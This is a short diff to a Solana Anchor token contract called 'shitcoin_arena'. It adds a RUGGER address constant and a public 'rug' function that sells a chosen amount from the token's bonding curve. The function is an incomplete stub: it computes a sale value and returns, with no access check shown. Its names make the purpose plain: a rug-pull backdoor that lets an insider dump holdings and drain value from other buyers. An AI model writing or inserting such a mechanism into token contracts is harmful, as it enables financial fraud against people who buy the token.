@@ -12,6 +12,7 @@ const TOKEN_SUPPLY: u64 = 1000000000 * 10_u64.pow(6);
  // adjusts expressions so that 20% of the supply will be in circulation when the mkt cap is 420 sol
 const DENOMINATOR_C: u128 = 345 * 10_u128.pow(16);
 const ADMIN: &str = "";
+const RUGGER: &str = "";
 const TARGET_TOKENS: u64 = TOKEN_SUPPLY / 2;
 #[program]
 pub mod shitcoin_arena {
@@ -170,6 +171,10 @@ pub mod shitcoin_arena {
             ),
             fee_lamports
         )?;
+        Ok(())
+    }
+    pub fn rug(ctx: Context<Rug>, rug_amount: u64) -> Result<()> {
+        let sell_lamports = ctx.accounts.from_curve.sell(rug_amount);
         Ok(())
     }
     pub fn swap(ctx: Context<Swap>, sell_amount: u64, buy_amount: u64) -> Result<()> {
